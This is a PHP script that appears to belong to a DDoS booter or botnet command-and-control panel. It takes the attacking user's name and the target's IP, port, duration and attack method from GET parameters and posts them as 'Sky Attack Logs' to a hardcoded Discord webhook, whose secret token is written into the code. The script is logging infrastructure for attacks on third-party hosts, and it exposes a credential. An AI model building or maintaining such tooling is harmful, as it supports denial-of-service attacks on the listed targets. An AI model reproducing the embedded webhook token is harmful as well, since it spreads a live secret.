<?php
//=======================================================================================================
// Create new webhook in your Discord channel settings and copy&paste URL
//=======================================================================================================
$cncusername = $_GET['username'];
$host = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
$method = $_GET['method'];
$webhookurl = "https://discord.com/api/webhooks/860264425948446751/ou3bgzfVkbgRBELkZqugcDx53kdcDTkFKrPqPEm4j00Ft57Id9DPgLEKJAHikGt6HhDV";

$timestamp = date("c", strtotime("now"));
$json_data = json_encode([
    "username" => "Sky Attack Logger",
    "tts" => false,
    "embeds" => [
        [
            "title" => "Sky Attack Logs",
            "type" => "rich",
            "description" => "**Username**: $cncusername\n**IP**: $host\n**Port**: $port\n**Time**: $time\n**Method**: $method",
            "timestamp" => $timestamp,
            "color" => hexdec( "8500ff" ),
            "footer" => [
                "text" => "",
            ],
            "image" => [
                "url" => ""
            ],
            "thumbnail" => [
                "url" => ""
            ],
            "author" => [
                "name" => "",
                "url" => ""
            ],
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
// If you need to debug, or find out why you can't send message uncomment line below, and execute script.
// echo $response;
curl_close( $ch );